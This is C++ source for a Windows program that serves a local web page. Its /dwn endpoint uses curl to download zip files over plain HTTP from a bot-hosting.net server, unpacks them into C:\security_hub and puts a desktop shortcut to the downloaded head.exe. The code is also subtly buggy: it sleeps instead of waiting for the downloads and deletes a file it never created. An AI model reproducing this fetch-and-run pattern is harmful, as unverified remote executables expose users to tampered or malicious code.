#include "../lib/httplib.h"
#include "../include/config.h"
#include "../include/html.h"
#include "../include/func_app.h"
#include "../include/func_shell.h"

#include <iostream>
#include <filesystem>
#include <string>
#include <Windows.h>
#include <shlobj.h>
#include <thread>
#include <future>

void start_server(int port) {
    httplib::Server svr;

    auto html_content_ptr = std::make_shared<std::string>(html_content);

    svr.Get("/", [html_content_ptr](const httplib::Request& req, httplib::Response& res) {
        if (html_content_ptr->empty()) {
            res.status = 500;
            res.set_content("Error: Could not read index.html", "text/plain");
        } else {
            res.set_content(*html_content_ptr, "text/html");
        }
    });

    svr.Get("/exit", [html_content_ptr](const httplib::Request& req, httplib::Response& res) {
        if (html_content_ptr->empty()) {
            res.status = 500;
            res.set_content("Error: Could not read index.html", "text/plain");
        } else {
            exit(1);
        }
    });

    svr.Post("/dwn", [html_content_ptr](const httplib::Request& req, httplib::Response& res) {
        if (html_content_ptr->empty()) {
            res.status = 500;
            res.set_content("Error: Could not read index.html", "text/plain");
        } else {
            std::string command;
            
            command = "curl -L -o core.zip http://fi3.bot-hosting.net:23113/core.zip";
            runCommandInBackground(command.c_str());
            std::cout << "done command" << std::endl;

            command = "curl -L -o head.zip http://fi3.bot-hosting.net:23113/head.zip";
            runCommandInBackground(command.c_str());
            std::cout << "done command" << std::endl;
            
            std::this_thread::sleep_for(std::chrono::seconds(2));

            unzip("core.zip", "C:\\security_hub", 5536);
            unzip("head.zip", "C:\\security_hub\\app_back_end", 95536);

            char path[MAX_PATH];
            HRESULT hr = SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
            if (SUCCEEDED(hr)) {
                std::wstring shortcutPath = std::wstring(path, path + strlen(path)) + L"\\main.lnk";
                std::wstring targetPath = L"C:\\security_hub\\app_back_end\\head.exe";
                std::wstring workingDir = L"C:\\security_hub\\app_back_end";

                CreateShortcut(shortcutPath, targetPath, workingDir);

                std::cout << "done" << std::endl;
            } else {
                std::cerr << "error create" << std::endl;
            }

            deleteFile("main.zip");

            Sleep(sleep_app);

            std::cout << "done" << std::endl;

            res.set_content("0", "text/plain");
        }
    });

    svr.listen("127.0.0.1", port);
}
